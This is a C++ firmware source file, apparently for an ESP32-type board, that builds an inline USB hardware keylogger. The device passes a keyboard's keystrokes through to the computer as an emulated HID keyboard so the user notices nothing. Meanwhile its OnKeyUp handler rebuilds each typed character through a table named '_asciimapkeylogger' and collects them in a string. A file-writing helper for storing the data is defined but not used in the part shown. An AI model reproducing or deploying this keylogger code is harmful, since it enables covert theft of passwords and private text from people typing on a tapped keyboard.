#include "hidkeyboard.h"

HIDkeyboard Keyboard;

#define SHIFT   0x80
#define ALTGR   0x40

uint8_t modifiers=0;
uint8_t modifiersard=0;
String tmp_key;
int key_modifier;
String cmd;

//modifiers
int leftctrl_status=0;
int leftshift_status=0;
int leftalt_status=0;
int leftgui_status=0;
int rightctrl_status=0;
int rightshift_status=0;
int rightalt_status=0;
int rightgui_status=0;

uint8_t _asciimapkeylogger[256] =
{
  0x00,             // NUL
  0x00,             // SOH
  0x00,             // STX
  0x00,             // ETX
  0x00,             // EOT
  0x00,             // ENQ
  0x00,             // ACK
  0x00,             // BEL
  0x2a,      // BS  Backspace
  0x2b,      // TAB  Tab
  0x28,      // LF  Enter
  0x00,             // VT
  0x00,             // FF
  0x00,             // CR
  0x00,             // SO
  0x00,             // SI
  0x00,             // DEL
  0x00,             // DC1
  0x00,             // DC2
  0x00,             // DC3
  0x00,             // DC4
  0x00,             // NAK
  0x00,             // SYN
  0x00,             // ETB
  0x00,             // CAN
  0x00,             // EM
  0x00,             // SUB
  0x00,             // ESC
  0x00,             // FS
  0x00,             // GS
  0x00,             // RS
  0x00,             // US

  0x2c,       //  ' '
  0x1e|SHIFT,     // !
  0x34|SHIFT,     // "
  0x20|SHIFT,    // #
  0x21|SHIFT,    // $
  0x22|SHIFT,    // %
  0x24|SHIFT,    // &
  0x34,          // '
  0x26|SHIFT,    // (
  0x27|SHIFT,    // )
  0x25|SHIFT,    // *
  0x2e|SHIFT,    // +
  0x36,          // ,
  0x2d,          // -
  0x37,          // .
  0x38,          // /
  0x27,          // 0
  0x1e,          // 1
  0x1f,          // 2
  0x20,          // 3
  0x21,          // 4
  0x22,          // 5
  0x23,          // 6
  0x24,          // 7
  0x25,          // 8
  0x26,          // 9
  0x33|SHIFT,      // :
  0x33,          // ;
  0x36|SHIFT,      // <
  0x2e,          // =
  0x37|SHIFT,      // >
  0x38|SHIFT,      // ?
  0x1f|SHIFT,      // @
  0x04|SHIFT,      // A
  0x05|SHIFT,      // B
  0x06|SHIFT,      // C
  0x07|SHIFT,      // D
  0x08|SHIFT,      // E
  0x09|SHIFT,      // F
  0x0a|SHIFT,      // G
  0x0b|SHIFT,      // H
  0x0c|SHIFT,      // I
  0x0d|SHIFT,      // J
  0x0e|SHIFT,      // K
  0x0f|SHIFT,      // L
  0x10|SHIFT,      // M
  0x11|SHIFT,      // N
  0x12|SHIFT,      // O
  0x13|SHIFT,      // P
  0x14|SHIFT,      // Q
  0x15|SHIFT,      // R
  0x16|SHIFT,      // S
  0x17|SHIFT,      // T
  0x18|SHIFT,      // U
  0x19|SHIFT,      // V
  0x1a|SHIFT,      // W
  0x1b|SHIFT,      // X
  0x1c|SHIFT,      // Y
  0x1d|SHIFT,      // Z
  0x2f,          // [
  0x31,          // bslash
  0x30,          // ]
  0x23|SHIFT,    // ^
  0x2d|SHIFT,    // _
  0x35,          // `
  0x04,          // a
  0x05,          // b
  0x06,          // c
  0x07,          // d
  0x08,          // e
  0x09,          // f
  0x0a,          // g
  0x0b,          // h
  0x0c,          // i
  0x0d,          // j
  0x0e,          // k
  0x0f,          // l
  0x10,          // m
  0x11,          // n
  0x12,          // o
  0x13,          // p
  0x14,          // q
  0x15,          // r
  0x16,          // s
  0x17,          // t
  0x18,          // u
  0x19,          // v
  0x1a,          // w
  0x1b,          // x
  0x1c,          // y
  0x1d,          // z
  0x2f|SHIFT,    // {
  0x31|SHIFT,    // |
  0x30|SHIFT,    // }
  0x35|SHIFT,    // ~
  0        // DEL
};

void SetModifiers(void) {
    modifiers=0;
    if (leftctrl_status) modifiers = (modifiers | KEYBOARD_MODIFIER_LEFTCTRL);
    if (leftshift_status) modifiers = (modifiers | KEYBOARD_MODIFIER_LEFTSHIFT);
    if (leftalt_status) modifiers = (modifiers | KEYBOARD_MODIFIER_LEFTALT);
    if (leftgui_status) modifiers = (modifiers | KEYBOARD_MODIFIER_LEFTGUI);
    if (rightctrl_status) modifiers = (modifiers | KEYBOARD_MODIFIER_RIGHTCTRL);
    if (rightshift_status) modifiers = (modifiers | KEYBOARD_MODIFIER_RIGHTSHIFT);
    if (rightalt_status) modifiers = (modifiers |  KEYBOARD_MODIFIER_RIGHTALT);
    if (rightgui_status) modifiers = (modifiers | KEYBOARD_MODIFIER_RIGHTGUI);  
};

void SetModifiersArd(void) {
    modifiersard=0;
    if (leftshift_status) modifiersard = (modifiersard | SHIFT);
    if (rightalt_status) modifiersard = (modifiersard |  ALTGR);   
};

void writeFile(fs::FS &fs, const char * path, int message){
  File file = fs.open(path, FILE_WRITE);
  if(!file){
    return;
  }
  if(file.print(message)){
  } else {
  }
  file.close();
}

class KbdRptParser : public KeyboardReportParser
{
  //void PrintKey(uint8_t mod, uint8_t key);
  //char lastkey[2] = {0,0};
  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);
    void OnKeyDown	(uint8_t mod, uint8_t key);
    void OnKeyUp	(uint8_t mod, uint8_t key);
    void OnKeyPressed(uint8_t key);
};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
{
  
  SetModifiers();
  Keyboard.sendPress(key, modifiers);
  
}

void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {

  MODIFIERKEYS beforeMod;
  *((uint8_t*)&beforeMod) = before;

  MODIFIERKEYS afterMod;
  *((uint8_t*)&afterMod) = after;

  if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) {
    leftctrl_status=!leftctrl_status;
  }
  if (beforeMod.bmLeftShift != afterMod.bmLeftShift) {
    leftshift_status=!leftshift_status;
  }
  if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) {
    leftalt_status=!leftalt_status;
  }
  if (beforeMod.bmLeftGUI != afterMod.bmLeftGUI) {
    leftgui_status=!leftgui_status;
  }

  if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) {
    rightctrl_status=!rightctrl_status;
  }
  if (beforeMod.bmRightShift != afterMod.bmRightShift) {
    rightshift_status=!rightshift_status;
  }
  if (beforeMod.bmRightAlt != afterMod.bmRightAlt) {
    rightalt_status=!rightalt_status;
  }
  if (beforeMod.bmRightGUI != afterMod.bmRightGUI) {
    rightgui_status=!rightgui_status;
  }

}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)
{
  Keyboard.sendRelease();
  SetModifiersArd();
  key_modifier = key|modifiersard;
  for (int i = 0; i < 256; i++) {
    if(_asciimapkeylogger[i] == key_modifier){
      cmd += ((char)i);
    }
  }
}
